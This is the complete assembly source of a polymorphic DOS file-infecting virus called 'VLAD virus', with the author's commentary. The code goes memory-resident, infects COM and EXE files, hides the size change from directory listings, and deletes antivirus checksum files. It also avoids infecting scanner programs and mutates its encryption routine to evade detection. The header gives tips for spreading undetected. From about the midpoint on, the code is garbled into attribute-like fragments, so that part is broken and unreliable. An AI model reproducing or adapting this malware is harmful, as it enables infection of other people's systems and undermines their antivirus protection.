



;               The VLAD virus!
;               +-------------+

;                                               by Qark/VLAD!


;       OVL files... never again!  I give this piece of advice to anyone.
; By avoiding the infection of OVL's your virus may spread for long times
; without discovery.  Otherwise everything crashes... ok, not everything
; but some large application programs do and that certainly makes people
; suspicious.  Don't do it!
  
;       WoW!  My first ever polymorphic virus!  Yay! We'll see how it does.
; My goal is to make it so that there is no longer a signature and you'll
; need an algorithm to find it... but some lines of code can't really be
; switched with others so I face a bit of a dilemma.  My code has stood up
; to all the tests I've done on it so far... so we'll see.

;       According to my calculations there are a few million variations on
; this sucker. I have gotten it to the point that there are only seven bytes
; that remain the same.  Not too bad...

;       This virus is completely optimised.  Every routine has been stripped 
; to the barest minimum.  (Unlike Daddy in my last release).  It even passed
; the 'TZ' test.  He only managed to strip five bytes off this sucker.

; Features:  Doesn't infect EXE files that use internal overlays.
;            Doesn't get flagged under heuristics.
;            Deletes CRC checking files.
;            Findfirst/Findnext stealth.
;            Directory listing stealth.
;            Uses the DOS qualify function to fix-up the filename.
;               (This is a pretty good new feature... uppercase, full path
;                and it's smaller than a REP MOVSB!)
;            Int24h handler to stop write protect errors on floppys.
;            Doesn't infect SCAN*.*, TB*.*, F-PR*.* and DV.E*
;            Uses SFT's to bypass some DOS functions.
;            Infects readonly files without changing their attribute.
;            Slightly polymorphic (Seven stable bytes)
;            Doesn't infect COM files that are too big or small.
 
;       Assemble using a86.



	org     0

	db      0beh                    ;Stands for MOV SI,xxxx
delta   dw      100h                    ;We'll put the data offset in.

	db      0b0h                    ;Stands for MOV AL,xxxx
encryptor       db      0               ;The encryption byte.

poly6:
	add     si,offset enc_start     ;Point to the bit to encrypt.


	call    encrypt                 ;Decrypt the file.

enc_start:                              ;Everything after this point
					;has been encrypted.

	sub     si,offset enc_end       ;Restore SI.

	;mov     word ptr [si+offset quit],20cdh
	db      0c7h,44h
	db      offset quit
	dw      20cdh
quit:                
	mov     word ptr [si+offset quit],44c7h
					;Install the TSR now.
	push    bx
	push    cx
	push    ds
	push    es
	push    si

	mov     ax,0CAFEh               ;Eat here.
	int     21h

	cmp     ax,0F00Dh               ;Is there any of this ?
	je      bad_mem_exit            ;Yep!  Time for lunch! No viral
					;activity today!

	mov     ax,es                   ;ES = PSP
	dec     ax
	mov     ds,ax                   ;DS=MCB segment

	cmp     byte ptr [0],'Z'        ;Z=last MCB
	jne     bad_mem_exit
	
	sub     word ptr [3],160        ;160*16=2560 less memory
	sub     word ptr [12h],160      ;[12h] = PSP:[2] = Top of memory
	mov     ax,word ptr [12h]
;------------------------------
	push    cs
	pop     ds                      ;DS=CS

	xor     bx,bx                   ;ES=0
	mov     es,bx

	mov     bx,word ptr es:[132]    ;get int21h

	mov     word ptr [si+offset i21],bx

	mov     bx,word ptr es:[134]    ;get int21h
	mov     word ptr [si+offset i21 + 2],bx

;------------------------------

	mov     es,ax                   ;Store our stuff in here...

	xor     di,di
	mov     cx,offset length
	rep     movsb                   ;Move the Virus to ES:DI
;------------------------------
	
	xor     bx,bx                   ;ES=0
	mov     ds,bx

	mov     word ptr [132],offset infection
	mov     word ptr [134],ax
	
bad_mem_exit:

	pop     si
	pop     es
	pop     ds
	pop     cx
	pop     bx

	cmp     byte ptr [si+offset com_exe],1
	je      Exe_Exit

	mov     ax,word ptr [si+offset old3]
	mov     word ptr [100h],ax
	mov     al,byte ptr [si+offset old3+2]
	mov     [102h],al
	
	mov     ax,100h
	jmp     ax


Exe_exit:

	mov     ax,es                           ;ES=PSP
	add     ax,10h                          ;PSP+10H = start of actual
						;exe file.
	
	add     word ptr [si+jump+2],ax         ;Fix jump for original CS.
	
	mov     sp,word ptr [si+offset orig_sp]
	add     ax,word ptr [si+offset orig_ss] ;Fix segment with AX.
	mov     ss,ax

	push    es
	pop     ds

	xor     si,si
	xor     ax,ax

	db      0eah
	jump    dd      0


	db      '[VLAD virus]',0
	db      'by VLAD!',0


infection       proc    far
	
	push    ax                      ;Save AX

	xchg    ah,al                   ;Swap AH,AL

	cmp     al,4bh                  ;Cmp AL,xx is smaller than AH
	je      test_file               ;Thanx TZ! :)
	cmp     al,43h
	je      test_file
	cmp     al,56h
	je      test_file
	cmp     ax,006ch
	je      test_file
	cmp     al,3dh
	je      test_file
	
	cmp     al,11h                  ;Do directory stealth.
	je      dir_listing
	cmp     al,12h
	je      dir_listing

	cmp     al,4eh                  ;Find_first/Find_next stealth.
	je      find_file
	cmp     al,4fh
	je      find_file
	
	pop ax

	cmp     ax,0CAFEh               ;Where I drink coffee!
	jne     jump1_exit

	mov     ax,0F00Dh               ;What I eat while I'm there.

	iret

dir_listing:
	jmp     dir_stealth
find_file:
	jmp     search_stealth
jump1_exit:        
	
	jmp     jend        
	
test_file:

	push    bx
	push    cx
	push    dx
	push    ds
	push    es
	push    si
	push    di

	cmp     al,6ch
	jne     no_fix_6c

	mov     dx,si

no_fix_6c:

	mov     si,dx                   ;DS:SI = Filename.

	push    cs
	pop     es                      ;ES=CS

	mov     ah,60h                  ;Get qualified filename.
	mov     di,offset length        ;DI=Buffer for filename.
	call    int21h                  ;This converts it to uppercase too!

					;CS:LENGTH = Filename in uppercase
					;with path and drive.  Much easier
					;to handle now!

	push    cs
	pop     ds                      ;DS=CS

	mov     si,di                   ;SI=DI=Offset of length.

	cld                             ;Clear direction flag.

find_ascii_z:

	lodsb
	cmp     al,0
	jne     find_ascii_z

	sub     si,4                    ;Points to the file extension. 'EXE'

	lodsw                           ;Mov AX,DS:[SI]

	cmp     ax,'XE'                 ;The 'EX' out of 'EXE'
	jne     test_com
	
	lodsb                           ;Mov AL,DS:[SI]

	cmp     al,'E'                  ;The last 'E' in 'EXE'
	jne     jump2_exit

	jmp     do_file                 ;EXE-file

test_com:

	cmp     ax,'OC'                 ;The 'CO' out of 'COM'
	jne     jump2_exit

	lodsb                           ;Mov AL,DS:[SI]

	cmp     al,'M'
	je      do_file                 ;COM-file
	
jump2_exit:
	jmp     far_pop_exit            ;Exit

Do_file:

	call    chk4scan
	jc      jump2_Exit
	
	mov     ax,3d00h                ;Open file.
	mov     dx,di                   ;DX=DI=Offset length.
	call    int21h

	jc      jump2_exit

	mov     bx,ax                   ;File handle into BX.

	call    get_sft                 ;Our SFT.

					;Test for infection.
	mov     ax,word ptr es:[di+0dh] ;File time into AX from SFT.
	mov     word ptr es:[di+2],2    ;Bypass Read only attribute.
	and     ax,1f1fh                ;Get rid of the shit we don't need.
	cmp     al,ah                   ;Compare the seconds with minutes.
	je      jump2_exit

	push    cs
	pop     es                      ;ES=CS

	call    del_crc_files
					;Read the File header in to test
					;for EXE or COM.

	mov     ah,3fh                  ;Read from file.
	mov     cx,1ch                  ;1C bytes.
	call    int21h                  ;DX=Offset length from del_crc_files
					;We don't need the filename anymore
					;so use that space as a buffer.

	;Save int24h and point to our controller.

	xor     ax,ax
	mov     es,ax

	push    word ptr es:[24h*4]     ;Save it.
	push    word ptr es:[24h*4+2]

	mov     word ptr es:[24h*4],offset int24h
	mov     word ptr es:[24h*4+2],cs        ;Point it!

	push    cs
	pop     es
	
	mov     si,dx                   ;SI=DX=Offset of length.

	mov     ax,word ptr [si]        ;=Start of COM or EXE.
	add     al,ah                   ;Add possible MZ.
	cmp     al,167                  ;Test for MZ.
	je      exe_infect
	jmp     com_infect

EXE_Infect:

	mov     byte ptr com_exe,1      ;Signal EXE file.

	cmp     word ptr [si+1ah],0     ;Test for overlays.
	jne     exe_close_exit          ;Quick... run!!!

	push    si                      ;SI=Offset of header

	add     si,0eh                  ;SS:SP are here.
	mov     di,offset orig_ss
	movsw                           ;Move them!
	movsw

	mov     di,offset jump          ;The CS:IP go in here.

	lodsw                           ;ADD SI,2 - AX destroyed.

	movsw
	movsw                           ;Move them!
	
	pop     si

	call    get_sft                 ;ES:DI = SFT for file.

	mov     ax,word ptr es:[di+11h] ;File length in DX:AX.
	mov     dx,word ptr es:[di+13h]
	mov     cx,16                   ;Divide by paragraphs.
	div     cx

	sub     ax,word ptr [si+8]      ;Subtract headersize.

	mov     word ptr delta,dx       ;Initial IP.

	mov     word ptr [si+14h],dx    ;IP in header.
	mov     word ptr [si+16h],ax    ;CS in header.

	add     dx,offset stack_end     ;Fix SS:SP for file.

	mov     word ptr [si+0eh],ax    ;We'll make SS=CS
	mov     word ptr [si+10h],dx    ;SP=IP+Offset of our buffer.

	
	mov     ax,word ptr es:[di+11h] ;File length in DX:AX.
	mov     dx,word ptr es:[di+13h]

	add     ax,offset length        ;Add the virus length on.
	adc     dx,0                    ;32bit

	mov     cx,512                  ;Divide by pages.
	div     cx

	and     dx,dx
	jz      no_page_fix

	inc     ax                              ;One more for the partial
						;page!
no_page_fix:

	mov     word ptr [si+4],ax              ;Number of pages.
	mov     word ptr [si+2],dx              ;Partial page.

	mov     word ptr es:[di+15h],0          ;Lseek to start of file.
	
	call    get_date                        ;Save the old time/date.

	mov     ah,40h                          ;Write header to file.
	mov     dx,si                           ;Our header buffer.
	mov     cx,1ch                          ;1CH bytes.
	call    int21h

	jc      exe_close_exit

	mov     ax,4202h                        ;End of file.  Smaller than
						;using SFT's.
	xor     cx,cx                           ;Zero CX
	cwd                                     ;Zero DX (If AX < 8000h="" then="" ;cwd="" moves="" zero="" into="" dx)="" call="" int21h="" call="" enc_setup="" ;thisll="" encrypt="" it="" and="" move="" ;it="" to="" the="" end="" of="" file.="" exe_close_exit:="" jmp="" com_close_exit="" com_infect:="" mov="" byte="" ptr="" com_exe,0="" ;flag="" com="" infection.="" mov="" ax,word="" ptr="" [si]="" ;save="" com="" files="" first="" 3="" bytes.="" mov="" word="" ptr="" old3,ax="" mov="" al,[si+2]="" mov="" byte="" ptr="" old3+2,al="" call="" get_sft="" ;sft="" is="" at="" es:di="" mov="" ax,es:[di+11h]="" ;ax="File" size="" cmp="" ax,64000="" ja="" com_close_exit="" ;too="" big.="" cmp="" ax,1000="" jb="" com_close_exit="" ;too="" small.="" push="" ax="" ;save="" filesize.="" mov="" newoff,ax="" ;for="" the="" new="" jump.="" sub="" newoff,3="" ;fix="" the="" jump.="" mov="" word="" ptr="" es:[di+15h],0="" ;lseek="" to="" start="" of="" file="" :)="" call="" get_date="" ;save="" original="" file="" date.="" mov="" ah,40h="" mov="" cx,3="" mov="" dx,offset="" new3="" ;write="" the="" virus="" jump="" to="" start="" of="" call="" int21h="" ;file.="" pop="" ax="" ;restore="" file="" size.="" jc="" com_close_exit="" ;if="" an="" error="" occurred...="" exit.="" mov="" word="" ptr="" es:[di+15h],ax="" ;lseek="" to="" end="" of="" file.="" add="" ax,100h="" ;file="" size="" +="" 100h.="" mov="" word="" ptr="" delta,ax="" ;the="" delta="" offset="" for="" com="" files.="" call="" enc_setup="" com_close_exit:="" mov="" ah,3eh="" call="" int21h="" ;restore="" int24h="" xor="" ax,ax="" mov="" es,ax="" pop="" word="" ptr="" es:[24h*4+2]="" pop="" word="" ptr="" es:[24h*4]="" far_pop_exit:="" pop="" di="" pop="" si="" pop="" es="" pop="" ds="" pop="" dx="" pop="" cx="" pop="" bx="" pop="" ax="" jend:="" db="" 0eah="" ;opcode="" for="" jmpf="" i21="" dd="" 0="" ;$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$="" ;$$="" procedures="" and="" data="" $$="" ;$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$="" int21h="" proc="" near="" ;our="" int="" 21h="" pushf="" call="" dword="" ptr="" cs:[i21]="" ret="" int21h="" endp="" int24h="" proc="" near="" mov="" al,3="" iret="" int24h="" endp="" search_stealth:="" pop="" ax="" ;restore="" ax.="" call="" int21h="" jc="" end_search="" push="" es="" push="" bx="" push="" si="" mov="" ah,2fh="" call="" int21h="" mov="" si,bx="" mov="" bx,word="" ptr="" es:[si+16h]="" and="" bx,1f1fh="" cmp="" bl,bh="" jne="" search_pop="" ;is="" our="" marker="" set="" sub="" word="" ptr="" es:[si+1ah],offset="" length="" ;subtract="" the="" file="" length.="" sbb="" word="" ptr="" es:[si+1ch],0="" search_pop:="" pop="" si="" pop="" bx="" pop="" es="" clc="" end_search:="" retf="" 2="" ;this="" is="" the="" same="" as="" an="" iret="" ;except="" that="" the="" flags="" aren't="" popped="" ;off="" so="" our="" carry="" remains="" set.="" dir_stealth:="" ;this="" bit="" means="" that="" when="" you="" do="" a="" 'dir'="" there="" is="" no="" change="" in="" ;file="" size.="" pop="" ax="" call="" int21h="" ;call="" the="" interrupt="" cmp="" al,0="" ;straight="" off.="" jne="" end_of_dir="" push="" es="" push="" ax="" ;save="" em.="" push="" bx="" push="" si="" mov="" ah,2fh="" ;get="" dta="" address.="" call="" int21h="" mov="" si,bx="" cmp="" byte="" ptr="" es:[si],0ffh="" ;extended="" fcb="" jne="" not_extended="" add="" si,7="" ;add="" the="" extra's.="" not_extended:="" mov="" bx,word="" ptr="" es:[si+17h]="" ;move="" time.="" and="" bx,1f1fh="" cmp="" bl,bh="" jne="" dir_pop="" ;is="" our="" marker="" set="" sub="" word="" ptr="" es:[si+1dh],offset="" length="" ;subtract="" the="" file="" length.="" sbb="" word="" ptr="" es:[si+1fh],0="" dir_pop:="" pop="" si="" pop="" bx="" pop="" ax="" pop="" es="" end_of_dir:="" iret="" get_date="" proc="" near="" ;saves="" the="" date="" into="" date="" and="" time.="" mov="" ax,5700h="" ;get="" date/time.="" call="" int21h="" mov="" word="" ptr="" time,cx="" mov="" word="" ptr="" date,dx="" ret="" get_date="" endp="" time="" dw="" 0="" date="" dw="" 0="" set_marker="" proc="" near="" ;sets="" the="" time="" back="" and="" changes="" the="" time="" into="" an="" infection="" marker.="" mov="" cx,time="" mov="" al,ch="" and="" al,1fh="" and="" cl,0e0h="" or="" cl,al="" mov="" dx,date="" mov="" ax,5701h="" call="" int21h="" ret="" set_marker="" endp="" polymorphic="" proc="" near="" ;moves="" random="" instructions="" into="" the="" code.="" in="" ax,40h="" ;random="" in="" ax="" and="" ax,6="" ;between="" 0-3="" *="" 2="" mov="" di,offset="" enc_loop="" ;put="" the="" xor="" in="" a="" random="" position.="" add="" di,ax="" mov="" word="" ptr="" [di],0430h="" ;="XOR" [si],al="" mov="" dx,di="" ;already="" done="" this="" position="" mov="" di,offset="" poly1="" ;put="" the="" random="" instruction="" here.="" mov="" cx,3="" ;3="" random="" instructions.="" poly_enc_loop:="" in="" ax,40h="" ;random="" number="" in="" ax.="" and="" ax,14="" ;between="" 0-7.="" multiplied="" by="" 2.="" ;14="00001110b" mov="" si,offset="" database1="" ;si="" points="" to="" start="" of="" database.="" add="" si,ax="" ;add="" si="" with="" ax="" the="" random="" offset.="" cmp="" dx,di="" ;is="" the="" xor="" here="" jne="" poly_move="" ;nope="" its="" ok.="" inc="" di="" ;dont="" move="" where="" the="" xor="" is!="" inc="" di="" poly_move:="" movsw="" ;move="" the="" instruction.="" loop="" poly_enc_loop="" poly_cx:="" ;this="" time="" we="" are="" randomising="" the="" 'mov="" cx,'="" in="" the="" encryption="" ;routine="" with="" some="" pops.="" in="" ax,40h="" ;random="" number="" in="" ax.="" and="" ax,3="" ;0-3="" cmp="" ax,3="" je="" poly_cx="" ;we="" only="" have="" 3="" combinations="" to="" ;choose="" from="" so="" retry="" if="" the="" fourth="" ;option="" gets="" choosen.="" xchg="" al,ah="" ;swap="" em="" for="" aad.="" aad="" ;multiply="" ah="" by="" 10(decimal).="" shr="" al,1="" ;divide="" by="" 2.="" ;the="" overall="" effect="" of="" this="" is="" ;mul="" ax,5="" we="" need="" this="" because="" ;we="" have="" to="" move="" 5="" bytes.="" mov="" si,offset="" database2="" add="" si,ax="" mov="" di,offset="" poly5="" ;where="" to="" put="" the="" bytes.="" movsw="" ;move="" 5="" bytes="" movsw="" movsb="" in="" ax,40h="" ;rand="" in="" ax.="" and="" ax,12="" ;0-3*4="" mov="" si,offset="" database3="" add="" si,ax="" mov="" di,offset="" poly6="" movsw="" movsw="" in="" ax,40h="" and="" ax,2="" mov="" si,offset="" database4="" add="" si,ax="" mov="" di,offset="" poly7="" movsw="" in="" ax,40h="" and="" ax,2="" mov="" si,offset="" database5="" add="" si,ax="" mov="" di,offset="" poly8="" movsw="" ret="" db="" '[vip="" v0.01]',0="" polymorphic="" endp="" database1="" db="" 0f6h,0d0h="" ;not="" al="" 2="" bytes="" db="" 0feh,0c0h="" ;inc="" al="" 2="" bytes="" db="" 0f6h,0d8h="" ;neg="" al="" 2="" bytes="" db="" 0feh,0c8h="" ;dec="" al="" 2="" bytes="" db="" 0d0h,0c0h="" ;rol="" al,1="" 2="" bytes="" db="" 04h,17h="" ;add="" al,17h="" 2="" bytes="" db="" 0d0h,0c8h="" ;ror="" al,1="" 2="" bytes="" db="" 2ch,17h="" ;sub="" al,17h="" 2="" bytes="" database2:="" ;three="" variations="" on="" the="" one="" routine="" within="" encrypt.="" mov="" cx,offset="" enc_end="" -="" offset="" enc_start="" push="" cs="" pop="" ds="" push="" cs="" pop="" ds="" mov="" cx,offset="" enc_end="" -="" offset="" enc_start="" push="" cs="" mov="" cx,offset="" enc_end="" -="" offset="" enc_start="" pop="" ds="" database3:="" ;four="" variations="" of="" the="" routine="" at="" the="" start="" of="" the="" virus.="" add="" si,offset="" enc_start="" +="" 1="" dec="" si="" dec="" si="" add="" si,offset="" enc_start="" +1="" add="" si,offset="" enc_start="" -1="" inc="" si="" inc="" si="" add="" si,offset="" enc_start="" -1="" database4:="" ;this="" is="" for="" the="" inc="" si="" in="" the="" encryption.="" inc="" si="" cld="" cld="" inc="" si="" database5:="" ;this="" is="" for="" the="" ret="" in="" the="" encryption.="" ret="" db="" 0fh="" cld="" ret="" enc_setup="" proc="" near="" push="" cs="" pop="" es="" call="" polymorphic="" ;our="" polymorphic="" routine.="" inc="" byte="" ptr="" encryptor="" ;change="" the="" encryptor.="" jnz="" enc_not_zero="" ;test="" for="" zero.="" ;xor="" by="" zero="" is="" the="" same="" byte.="" inc="" byte="" ptr="" encryptor="" enc_not_zero:="" xor="" si,si="" mov="" di,offset="" length="" ;offset="" of="" our="" buffer.="" mov="" cx,offset="" length="" ;virus="" length.="" rep="" movsb="" ;move="" the="" virus="" up="" in="" memory="" for="" ;encryption.="" mov="" al,byte="" ptr="" encryptor="" mov="" si,offset="" length="" +="" offset="" enc_start="" call="" encrypt="" ;encrypt="" virus.="" mov="" ah,40h="" ;write="" virus="" to="" file="" mov="" dx,offset="" length="" ;buffer="" for="" encrypted="" virus.="" mov="" cx,offset="" length="" ;virus="" length.="" call="" int21h="" call="" set_marker="" ;mark="" file="" as="" infected.="" ret="" enc_setup="" endp="" get_sft="" proc="" near="" ;entry:="" bx="File" handle.="" ;exit:="" es:di="SFT." push="" bx="" mov="" ax,1220h="" ;get="" job="" file="" table="" entry.="" the="" byte="" pointed="" int="" 2fh="" ;at="" by="" es:[di]="" contains="" the="" number="" of="" the="" ;sft="" for="" the="" file="" handle.="" xor="" bx,bx="" mov="" bl,es:[di]="" ;get="" address="" of="" system="" file="" table="" entry.="" mov="" ax,1216h="" int="" 2fh="" pop="" bx="" ret="" get_sft="" endp="" del_crc_files="" proc="" near="" ;deletes="" av="" crc="" checking="" files.="" much="" smaller="" than="" the="" previous="" version.="" std="" ;scan="" backwards.="" find_slash2:="" ;find="" the="" backslash="" in="" the="" path.="" lodsb="" cmp="" al,'\'="" jne="" find_slash2="" cld="" ;scan="" forwards.="" lodsw="" ;add="" si,2="" -="" ax="" is="" destroyed.="" push="" si="" pop="" di="" ;di="SI=Place" to="" put="" filename.="" mov="" si,offset="" crc_files="" del_crc:="" push="" di="" ;save="" di.="" loadname:="" movsb="" cmp="" byte="" ptr="" [di-1],0="" jne="" loadname="" mov="" ah,41h="" call="" int21h="" ;delete.="" pop="" di="" cmp="" si,offset="" chk4scan="" jb="" del_crc="" ret="" del_crc_files="" endp="" ;delete="" these...="" crc_files="" db="" 'anti-vir.dat',0="" db="" 'msav.chk',0="" db="" 'chklist.cps',0="" db="" 'chklist.ms',0="" ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;="" chk4scan="" proc="" near="" ;this="" routine="" searches="" for="" scan,="" tb*="" and="" f-pr*="" and="" exits="" with="" the="" carry="" ;set="" if="" they="" are="" found.="" all="" these="" files="" self-check="" themselves="" so="" will="" alert="" ;the="" user="" to="" the="" viruses="" presence.="" dv.exe="" is="" checked="" by="" dv.com="" and="" won't="" ;execute.="" ;assumes="" di="offset" length,="" si="End" of="" filename="" std="" ;scan="" backwards.="" find_slash:="" ;find="" the="" backslash="" in="" the="" path.="" lodsb="" cmp="" al,'\'="" jne="" find_slash="" cld="" ;scan="" forwards.="" lodsw="" ;si="" points="" to="" byte="" before="" slash="" ;so="" we="" add="" 2.="" ax="" is="" killed.="" lodsw="" cmp="" ax,'cs'="" ;the="" 'sc'="" from="" scan.="" jne="" tbcheck="" lodsw="" cmp="" ax,'na'="" ;the="" 'an'="" from="" scan="" jne="" chkfail="" stc="" ;set="" carry.="" ret="" tbcheck:="" cmp="" ax,'bt'="" ;the="" 'tb'="" from="" tbsan.="" jne="" fcheck="" stc="" ;set="" carry.="" ret="" fcheck:="" cmp="" ax,'-f'="" ;the="" 'f-'="" from="" f-prot.="" jne="" dvcheck="" lodsw="" cmp="" ax,'rp'="" ;the="" 'pr'="" from="" f-prot.="" jne="" chkfail="" stc="" ;set="" carry="" ret="" dvcheck:="" cmp="" ax,'vd'="" ;the="" 'dv'="" from="" dv.exe.="" jne="" chkfail="" lodsw="" cmp="" ax,'e.'="" ;the="" '.e'="" from="" dv.exe.="" jne="" chkfail="" stc="" ret="" chkfail:="" clc="" ;clear="" the="" carry.="" ret="" chk4scan="" endp="" com_exe="" db="" 0="" ;1="EXE" new3="" db="" 0e9h="" ;the="" jump="" for="" the="" start="" of="" newoff="" dw="" 0="" ;com="" files.="" old3="" db="" 0cdh,20h,90h="" ;first="" 3="" comfile="" bytes="" here.="" orig_ss="" dw="" 0="" orig_sp="" dw="" 0="" enc_end:="" encrypt="" proc="" near="" ;encrypts="" the="" virus.="" ;si="offset" of="" bit="" to="" be="" encrypted="" ;al="encryptor" poly5:="" mov="" cx,offset="" enc_end="" -="" offset="" enc_start="" push="" cs="" pop="" ds="" enc_loop:="" poly1:="" ;the="" next="" four="" lines="" of="" code="" are="" ror="" al,1="" ;continuously="" swapped="" and="" moved="" with="" poly2:="" ;other="" code.="" ever="" changing...="" ror="" al,1="" poly3:="" ror="" al,1="" poly4:="" xor="" byte="" ptr="" [si],al="" poly7:="" nop="" inc="" si="" loop="" enc_loop="" poly8:="" nop="" ret="" encrypt="" endp="" length="" db="" 100="" dup="" (0)="" stack_end:="">